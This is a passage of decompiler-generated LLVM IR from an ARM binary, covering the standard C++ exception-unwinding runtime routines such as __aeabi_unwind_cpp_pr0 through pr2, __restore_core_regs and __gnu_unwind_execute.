  uselistorder i32 %v1_17510, { 1, 0 }
  uselistorder i32 %v2_17508, { 1, 0 }
  uselistorder i32 %v0_17498, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_17458, { 1, 0 }
  uselistorder i32 %v1_17454, { 1, 0 }
  uselistorder i32 %v0_17454, { 1, 0, 2 }
  uselistorder i32 %v4_1742c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_175d0, { 1, 2, 0 }
  uselistorder i32 %v0_17404, { 1, 0 }
  uselistorder i32 %v3_17400, { 1, 0, 2 }
  uselistorder i32 %v1_173d4, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_1760c, { 1, 0 }
  uselistorder i1 %v2_17440, { 1, 0, 2 }
  uselistorder i32 %v1_17344, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 64, 0, 13, 14, 62, 4, 23, 24, 15, 22, 2, 25, 16, 26, 1, 27, 28, 29, 5, 30, 31, 32, 33, 6, 34, 35, 36, 37, 7, 38, 8, 39, 40, 17, 41, 9, 42, 43, 44, 18, 45, 10, 46, 47, 19, 48, 49, 50, 51, 52, 20, 53, 11, 54, 55, 56, 57, 58, 59, 21, 60, 12, 61, 3, 63 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 23, 1, 15, 8, 4, 2, 5, 12, 13, 9, 10, 11, 14, 18, 19, 3, 20, 0, 21, 22, 6, 7, 16, 17 }
  uselistorder i32 48, { 15, 2, 8, 9, 3, 4, 0, 7, 5, 6, 10, 12, 13, 14, 11, 1 }
  uselistorder i32 44, { 39, 13, 2, 40, 41, 0, 12, 3, 4, 5, 6, 7, 8, 21, 22, 23, 24, 25, 26, 18, 19, 20, 9, 27, 28, 10, 1, 11, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 14, 15, 16, 17 }
  uselistorder i32 -2147483648, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder i32 1073741824, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 65536, { 4, 5, 6, 7, 8, 10, 9, 15, 11, 16, 12, 17, 13, 18, 14, 19, 20, 21, 25, 22, 26, 23, 27, 24, 28, 144, 145, 143, 148, 29, 30, 31, 32, 33, 34, 142, 35, 36, 37, 2, 38, 0, 3, 39, 40, 42, 41, 1, 45, 43, 44, 46, 52, 47, 53, 48, 54, 49, 50, 51, 56, 57, 58, 59, 55, 141, 61, 60, 63, 62, 65, 66, 67, 64, 70, 68, 69, 72, 73, 74, 71, 75, 76, 78, 77, 80, 81, 79, 82, 146, 83, 86, 84, 87, 85, 89, 90, 91, 88, 92, 97, 93, 98, 94, 99, 95, 96, 101, 102, 103, 100, 104, 147, 105, 106, 107, 109, 108, 110, 118, 111, 119, 112, 120, 113, 121, 114, 122, 115, 116, 117, 124, 125, 126, 127, 123, 128, 133, 129, 134, 130, 131, 132, 136, 138, 139, 140, 135, 137 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_20d14.594 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 15, 27, 68, 86, 69, 87, 16, 17, 70, 71, 72, 88, 18, 89, 90, 91, 19, 92, 93, 94, 20, 73, 95, 96, 21, 22, 23, 97, 74, 98, 24, 99, 25, 100, 101, 102, 4, 26, 103, 75, 104, 77, 105, 106, 107, 34, 33, 35, 108, 109, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 32, 63, 76, 80, 110, 5, 111, 112, 81 }
  uselistorder i32 -2, { 0, 27, 28, 6, 3, 4, 2, 7, 8, 9, 1, 5, 22, 23, 24, 25, 26, 15, 16, 17, 18, 19, 20, 21, 10, 11, 12, 13, 14 }
  uselistorder i32 80, { 13, 14, 15, 8, 6, 7, 0, 2, 1, 3, 4, 5, 11, 9, 10, 12 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17794, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_176b0, { 1, 0 }
  uselistorder label %dec_label_pc_17678, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1763c, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_175b8, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_174f8, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_174f4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17454, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_173b0, { 1, 0 }
  uselistorder label %dec_label_pc_173b0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_173b0.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_17850(i32 %arg1) local_unnamed_addr {
dec_label_pc_17850:
  %v0_17850 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17850, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17850
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17850, %bb
  %v10_17858 = phi i32 [ %arg1, %dec_label_pc_17850 ], [ 0, %bb ]
  ret i32 %v10_17858

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 22, 21, 20, 23, 25, 26, 27, 39, 16, 24, 40, 41, 42, 43, 44, 45, 36, 37, 28, 29, 17, 5, 38, 18, 19, 4, 13, 6, 32, 14, 12, 15, 7, 8, 9, 30, 10, 11, 33, 35, 31, 34, 46, 47 }
  uselistorder i1* @cpsr_z, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 40, 16, 17, 18, 36, 37, 38, 39, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 32, 33 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_17860 = load i32, i32* @r1, align 4
  %v2_17860 = load i32, i32* @r2, align 4
  %v4_17860 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_17860, i32 %v2_17860, i32 2)
  ret i32 %v4_17860
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_17868 = load i32, i32* @r1, align 4
  %v2_17868 = load i32, i32* @r2, align 4
  %v4_17868 = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_17868, i32 %v2_17868, i32 1)
  ret i32 %v4_17868
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_17870 = load i32, i32* @r1, align 4
  %v2_17870 = load i32, i32* @r2, align 4
  %v4_17870 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_17870, i32 %v2_17870, i32 0)
  ret i32 %v4_17870

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 7, 8, 9, 41, 10, 0, 19, 11, 20, 21, 22, 23, 42, 43, 44, 15, 16, 17, 18, 45, 46, 47, 58, 59, 60, 61, 50, 1, 51, 48, 49, 2, 3, 4, 39, 40, 5, 6, 52, 53, 54, 55, 56, 57, 38, 24, 12, 13, 14, 27, 28, 25, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_17878 = add i32 %tmp, 56
  %v4_17878 = inttoptr i32 %v3_17878 to i32*
  %v5_17878 = load i32, i32* %v4_17878, align 4
  %v6_17878 = add i32 %tmp, 60
  %v7_17878 = inttoptr i32 %v6_17878 to i32*
  %v8_17878 = load i32, i32* %v7_17878, align 4
  %v2_17884 = load i32, i32* %arg1, align 4
  %v3_17884 = add i32 %tmp, 4
  %v4_17884 = inttoptr i32 %v3_17884 to i32*
  %v5_17884 = load i32, i32* %v4_17884, align 4
  store i32 %v5_17884, i32* @r1, align 4
  %v12_17884 = add i32 %tmp, 16
  %v13_17884 = inttoptr i32 %v12_17884 to i32*
  %v14_17884 = load i32, i32* %v13_17884, align 4
  store i32 %v14_17884, i32* @r4, align 4
  %v15_17884 = add i32 %tmp, 20
  %v16_17884 = inttoptr i32 %v15_17884 to i32*
  %v17_17884 = load i32, i32* %v16_17884, align 4
  store i32 %v17_17884, i32* @r5, align 4
  %v18_17884 = add i32 %tmp, 24
  %v19_17884 = inttoptr i32 %v18_17884 to i32*
  %v20_17884 = load i32, i32* %v19_17884, align 4
  store i32 %v20_17884, i32* @r6, align 4
  %v21_17884 = add i32 %tmp, 28
  %v22_17884 = inttoptr i32 %v21_17884 to i32*
  %v23_17884 = load i32, i32* %v22_17884, align 4
  store i32 %v23_17884, i32* @r7, align 4
  %v24_17884 = add i32 %tmp, 32
  %v25_17884 = inttoptr i32 %v24_17884 to i32*
  %v26_17884 = load i32, i32* %v25_17884, align 4
  store i32 %v26_17884, i32* @r8, align 4
  %v27_17884 = add i32 %tmp, 36
  %v28_17884 = inttoptr i32 %v27_17884 to i32*
  %v29_17884 = load i32, i32* %v28_17884, align 4
  store i32 %v29_17884, i32* @sb, align 4
  %v30_17884 = add i32 %tmp, 40
  %v31_17884 = inttoptr i32 %v30_17884 to i32*
  %v32_17884 = load i32, i32* %v31_17884, align 4
  store i32 %v32_17884, i32* @sl, align 4
  store i32 %v8_17878, i32* @ip, align 4
  store i32 %v5_17878, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_17878)
  ret i32 %v2_17884

; uselistorder directives
  uselistorder i32 %v8_17878, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 39, 40, 41, 42, 10, 11, 4, 0, 45, 5, 43, 44, 8, 9, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 1, 79, 80, 81, 82, 83, 84, 85, 86, 87, 6, 88, 89, 19, 20, 2, 33, 34, 35, 36, 37, 38, 17, 18, 7, 12, 13, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 3, 14, 15, 16 }
  uselistorder i32 40, { 24, 20, 21, 22, 23, 8, 25, 1, 2, 9, 4, 5, 6, 3, 10, 11, 7, 12, 13, 14, 15, 16, 17, 19, 18, 0 }
  uselistorder i32* @sb, { 91, 92, 93, 4, 5, 6, 7, 74, 75, 76, 77, 78, 79, 80, 81, 82, 85, 83, 84, 86, 2, 63, 64, 48, 49, 3, 8, 9, 10, 0, 11, 12, 17, 18, 13, 14, 15, 16, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 1, 39, 40, 41, 42, 43, 44, 45, 46, 47, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 65, 66, 67, 68, 69, 70, 71, 72, 73, 87, 88, 89, 90 }
  uselistorder i32 36, { 18, 17, 4, 16, 7, 14, 8, 19, 6, 9, 3, 5, 15, 10, 0, 1, 2, 11, 12, 13 }
  uselistorder i32* @r8, { 208, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 1, 207, 0, 35, 209, 8, 210, 9, 36, 37, 38, 39, 22, 23, 24, 25, 26, 27, 28, 29, 30, 3, 31, 32, 33, 34, 40, 41, 42, 43, 44, 45, 46, 10, 211, 19, 20, 4, 21, 157, 158, 5, 159, 160, 161, 162, 163, 164, 165, 166, 6, 167, 168, 169, 170, 171, 172, 173, 174, 143, 144, 145, 146, 107, 108, 109, 110, 111, 124, 125, 126, 127, 47, 48, 49, 50, 11, 12, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 14, 15, 16, 17, 18, 13, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 81, 78, 79, 80, 85, 82, 83, 84, 86, 87, 88, 89, 90, 92, 91, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 147, 148, 2, 152, 149, 150, 151, 153, 154, 155, 156, 175, 176, 177, 178, 179, 180, 181, 182, 183, 187, 184, 185, 186, 7, 188, 189 }
  uselistorder i32 32, { 84, 81, 82, 83, 49, 72, 73, 64, 65, 85, 86, 46, 59, 87, 45, 80, 47, 50, 48, 71, 69, 70, 66, 67, 68, 51, 61, 62, 52, 76, 77, 78, 1, 2, 4, 3, 79, 6, 5, 8, 7, 10, 9, 63, 12, 11, 14, 13, 16, 15, 18, 17, 60, 20, 19, 21, 23, 22, 25, 24, 26, 27, 29, 28, 53, 54, 30, 74, 31, 75, 32, 55, 56, 33, 34, 35, 36, 37, 57, 38, 39, 40, 58, 41, 0, 42, 43, 44 }
  uselistorder i32 28, { 48, 11, 33, 36, 12, 29, 13, 49, 30, 50, 51, 52, 53, 7, 8, 34, 35, 31, 32, 14, 45, 46, 47, 0, 19, 1, 20, 2, 21, 3, 22, 4, 23, 5, 24, 6, 25, 15, 26, 16, 27, 17, 28, 9, 18, 38, 37, 39, 40, 41, 42, 43, 44, 10 }
  uselistorder i32 24, { 104, 103, 73, 74, 61, 62, 105, 10, 11, 106, 0, 1, 65, 66, 67, 68, 69, 70, 63, 64, 12, 71, 72, 75, 76, 7, 13, 97, 98, 99, 100, 40, 41, 14, 77, 78, 47, 79, 58, 42, 43, 44, 45, 46, 48, 49, 50, 51, 15, 52, 16, 53, 17, 54, 55, 56, 57, 59, 60, 80, 81, 82, 83, 18, 19, 20, 21, 2, 22, 23, 8, 84, 85, 24, 25, 3, 26, 86, 27, 28, 29, 9, 87, 30, 31, 32, 88, 33, 4, 89, 90, 91, 92, 34, 35, 93, 36, 94, 37, 5, 95, 6, 38, 96, 101, 39, 102 }
  uselistorder i32 20, { 115, 113, 114, 116, 1, 4, 10, 31, 36, 37, 25, 26, 117, 27, 118, 119, 120, 2, 121, 5, 122, 123, 3, 124, 32, 11, 28, 29, 30, 33, 34, 35, 12, 38, 39, 0, 125, 102, 103, 104, 105, 106, 107, 108, 13, 109, 110, 111, 24, 41, 42, 14, 43, 15, 44, 23, 16, 45, 40, 46, 47, 48, 50, 6, 49, 51, 52, 53, 54, 55, 56, 7, 57, 58, 59, 60, 61, 62, 64, 65, 17, 63, 66, 67, 68, 69, 70, 71, 73, 74, 18, 72, 75, 76, 77, 78, 80, 81, 19, 79, 82, 83, 84, 85, 86, 87, 89, 20, 88, 90, 91, 92, 95, 8, 93, 21, 94, 96, 97, 100, 9, 98, 22, 99, 101, 112 }
  uselistorder i32* @r1, { 147, 14, 15, 16, 4, 148, 149, 63, 64, 80, 82, 43, 2, 151, 44, 150, 145, 45, 46, 47, 17, 65, 1, 66, 67, 18, 154, 23, 5, 26, 27, 28, 29, 30, 31, 32, 6, 155, 156, 157, 158, 0, 159, 19, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 7, 177, 178, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 69, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 3, 79, 20, 81, 83, 84, 179, 21, 181, 182, 183, 184, 100, 101, 33, 85, 34, 35, 180, 22, 36, 37, 38, 86, 87, 131, 132, 133, 134, 135, 136, 137, 42, 138, 8, 139, 140, 9, 141, 144, 142, 10, 143, 88, 89, 25, 110, 90, 115, 146, 121, 122, 12, 123, 185, 186, 152, 153, 24, 13, 91, 124, 125, 92, 93, 39, 40, 41, 94, 95, 96, 97, 98, 126, 99, 127, 128, 11, 102, 103, 104, 105, 106, 107, 108, 109, 111, 112, 113, 114, 116, 117, 118, 119, 120, 129, 130 }
  uselistorder i32 60, { 3, 22, 23, 24, 4, 5, 6, 1, 7, 15, 16, 17, 18, 19, 20, 8, 11, 12, 9, 13, 14, 10, 0, 2, 21 }
  uselistorder i32 56, { 3, 31, 32, 27, 28, 8, 9, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 11, 10, 2, 12, 13, 14, 15, 16, 4, 5, 1, 6, 0, 7, 29, 30 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_17894 = load i32, i32* @r0, align 4
  ret i32 %v1_17894
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1789c = load i32, i32* @r0, align 4
  ret i32 %v1_1789c
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_178b0 = ptrtoint i32* %stack_var_-68 to i32
  %v2_178b4 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_178b0, i32 0)
  ret i32 %v2_178b4

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_178d4 = ptrtoint i32* %stack_var_-68 to i32
  %v2_178d8 = call i32 @__gnu_Unwind_Resume(i32 %v2_178d4, i32 0)
  ret i32 %v2_178d8

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_178f8 = ptrtoint i32* %stack_var_-68 to i32
  %v2_178fc = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_178f8, i32 0)
  ret i32 %v2_178fc

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1791c = ptrtoint i32* %stack_var_-68 to i32
  %v6_17920 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_1791c, i32 %arg2, i8* %arg3, i32 %v2_1791c)
  ret i32 %v6_17920

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_1794c = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_17954 = add i32 %tmp1, 76
  %v2_17954 = inttoptr i32 %v1_17954 to i32*
  %v3_17954 = load i32, i32* %v2_17954, align 4
  %v1_17958 = add i32 %v3_17954, 7
  %v2_17958 = inttoptr i32 %v1_17958 to i8*
  %v3_17958 = load i8, i8* %v2_17958, align 1
  %v4_17958 = zext i8 %v3_17958 to i32
  %v1_1795c = add i32 %v3_17954, 8
  %v3_17960 = mul nuw nsw i32 %v4_17958, 4
  %v2_17964 = add i32 %v3_17960, %v1_1795c
  %v3_17964 = inttoptr i32 %v2_17964 to i8*
  ret i8* %v3_17964
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_17974 = load i32, i32* @r6, align 4
  %v21_17974 = load i32, i32* @lr, align 4
  %v0_17978 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17978, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_17988

dec_label_pc_17988:                               ; preds = %dec_label_pc_17988.backedge, %entry
  %v3_17994 = phi i32 [ %v0_17988.pre, %dec_label_pc_17988.backedge ], [ %tmp, %entry ]
  %v1_17988 = add i32 %v3_17994, 8
  %v2_17988 = inttoptr i32 %v1_17988 to i8*
  %v3_17988 = load i8, i8* %v2_17988, align 1
  %v4_17988 = zext i8 %v3_17988 to i32
  store i32 %v4_17988, i32* %r3.global-to-local, align 4
  %v2_1798c = icmp eq i8 %v3_17988, 0
  store i1 %v2_1798c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1798c, label %dec_label_pc_1799c, label %.thread

.thread:                                          ; preds = %dec_label_pc_17988
  %v2_17990 = add nsw i32 %v4_17988, -1
  store i32 %v2_17990, i32* %r3.global-to-local, align 4
  %v2_17994 = trunc i32 %v2_17990 to i8
  store i8 %v2_17994, i8* %v2_17988, align 1
  %v0_17998.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17998.pr.pr, label %.thread.dec_label_pc_1799c_crit_edge, label %dec_label_pc_179c4

.thread.dec_label_pc_1799c_crit_edge:             ; preds = %.thread
  %v0_1799c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1799c

dec_label_pc_1799c:                               ; preds = %.thread.dec_label_pc_1799c_crit_edge, %dec_label_pc_17988
  %v0_1799c = phi i32 [ %v0_1799c.pre, %.thread.dec_label_pc_1799c_crit_edge ], [ %v3_17994, %dec_label_pc_17988 ]
  %v1_1799c = add i32 %v0_1799c, 9
  %v2_1799c = inttoptr i32 %v1_1799c to i8*
  %v3_1799c = load i8, i8* %v2_1799c, align 1
  %v4_1799c = zext i8 %v3_1799c to i32
  store i32 %v4_1799c, i32* %r3.global-to-local, align 4
  %v2_179a0 = icmp eq i8 %v3_1799c, 0
  store i1 %v2_179a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_179a0, label %dec_label_pc_17aa4, label %dec_label_pc_179a8

dec_label_pc_179a8:                               ; preds = %dec_label_pc_17a98, %dec_label_pc_1799c
  %v2_179ac = phi i32 [ %v0_17a98, %dec_label_pc_17a98 ], [ %v0_1799c, %dec_label_pc_1799c ]
  %v0_179a8 = phi i32 [ %v4_17a98, %dec_label_pc_17a98 ], [ %v4_1799c, %dec_label_pc_1799c ]
  %v1_179a8 = add nsw i32 %v0_179a8, -1
  store i32 %v1_179a8, i32* %r3.global-to-local, align 4
  %v1_179ac = trunc i32 %v1_179a8 to i8
  %v3_179ac = add i32 %v2_179ac, 9
  %v4_179ac = inttoptr i32 %v3_179ac to i8*
  store i8 %v1_179ac, i8* %v4_179ac, align 1
  %v0_179b0 = load i32, i32* @r5, align 4
  %v1_179b0 = add i32 %v0_179b0, 4
  %v2_179b0 = inttoptr i32 %v1_179b0 to i32*
  %v3_179b0 = load i32, i32* %v2_179b0, align 4
  store i32 %v3_179b0, i32* %r2.global-to-local, align 4
  %v1_179b4 = inttoptr i32 %v3_179b0 to i32*
  %v2_179b4 = load i32, i32* %v1_179b4, align 4
  store i32 %v2_179b4, i32* %r0.global-to-local, align 4
  %v4_179b4 = add i32 %v3_179b0, 4
  store i32 %v4_179b4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_179bc = inttoptr i32 %v0_179b0 to i32*
  store i32 %v2_179b4, i32* %v1_179bc, align 4
  %v5_179bc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_179bc, i32* %v2_179b0, align 4
  %v0_179c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_179c0 = trunc i32 %v0_179c0 to i8
  %v2_179c0 = load i32, i32* @r5, align 4
  %v3_179c0 = add i32 %v2_179c0, 8
  %v4_179c0 = inttoptr i32 %v3_179c0 to i8*
  store i8 %v1_179c0, i8* %v4_179c0, align 1
  br label %dec_label_pc_179c4

dec_label_pc_179c4:                               ; preds = %.thread, %dec_label_pc_179a8, %.thread6
  %v0_179c4 = load i32, i32* @r5, align 4
  %v1_179c4 = inttoptr i32 %v0_179c4 to i32*
  %v2_179c4 = load i32, i32* %v1_179c4, align 4
  %v3_179c8 = udiv i32 %v2_179c4, 16777216
  store i32 %v3_179c8, i32* @r4, align 4
  store i32 %v3_179c8, i32* %ip.global-to-local, align 4
  %v3_179d0 = mul i32 %v2_179c4, 256
  store i32 %v3_179d0, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_179c4, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_179d0, i32* %v1_179c4, align 4
  br i1 %tmp183, label %dec_label_pc_17aa4, label %dec_label_pc_179e0

dec_label_pc_179e0:                               ; preds = %dec_label_pc_179c4
  %v0_179e0 = load i32, i32* @r4, align 4
  %v1_179e0 = and i32 %v0_179e0, 128
  store i32 %v1_179e0, i32* %r1.global-to-local, align 4
  %v2_179e0 = icmp eq i32 %v1_179e0, 0
  store i1 %v2_179e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_179e0, label %dec_label_pc_17abc, label %dec_label_pc_179e8

dec_label_pc_179e8:                               ; preds = %dec_label_pc_179e0
  %v1_179e8 = and i32 %v0_179e0, 240
  store i32 %v1_179e8, i32* @r6, align 4
  %v7_179ec = icmp eq i32 %v1_179e8, 128
  store i1 %v7_179ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_179ec, label %dec_label_pc_179f4, label %dec_label_pc_17b18

dec_label_pc_179f4:                               ; preds = %dec_label_pc_179e8
  %v0_179f4 = load i32, i32* @r5, align 4
  %v1_179f4 = add i32 %v0_179f4, 8
  %v2_179f4 = inttoptr i32 %v1_179f4 to i8*
  %v3_179f4 = load i8, i8* %v2_179f4, align 1
  %v4_179f4 = zext i8 %v3_179f4 to i32
  store i32 %v4_179f4, i32* %r3.global-to-local, align 4
  %v2_179f8 = icmp eq i8 %v3_179f4, 0
  store i1 %v2_179f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_179f8, label %dec_label_pc_17a08, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_179f4
  %v2_179fc = add nsw i32 %v4_179f4, -1
  store i32 %v2_179fc, i32* %r3.global-to-local, align 4
  %v2_17a00 = trunc i32 %v2_179fc to i8
  store i8 %v2_17a00, i8* %v2_179f4, align 1
  %v0_17a04.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17a04.pr.pr, label %.thread3.dec_label_pc_17a08_crit_edge, label %dec_label_pc_17a38

.thread3.dec_label_pc_17a08_crit_edge:            ; preds = %.thread3
  %v0_17a08.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17a08

dec_label_pc_17a08:                               ; preds = %.thread3.dec_label_pc_17a08_crit_edge, %dec_label_pc_179f4
  %v2_17a1c = phi i32 [ %v0_17a08.pre, %.thread3.dec_label_pc_17a08_crit_edge ], [ %v0_179f4, %dec_label_pc_179f4 ]
  %v1_17a08 = add i32 %v2_17a1c, 9
  %v2_17a08 = inttoptr i32 %v1_17a08 to i8*
  %v3_17a08 = load i8, i8* %v2_17a08, align 1
  %v4_17a08 = zext i8 %v3_17a08 to i32
  store i32 %v4_17a08, i32* %r3.global-to-local, align 4
  %v2_17a0c = icmp eq i8 %v3_17a08, 0
  store i1 %v2_17a0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17a0c, label %dec_label_pc_17a48, label %dec_label_pc_17a18

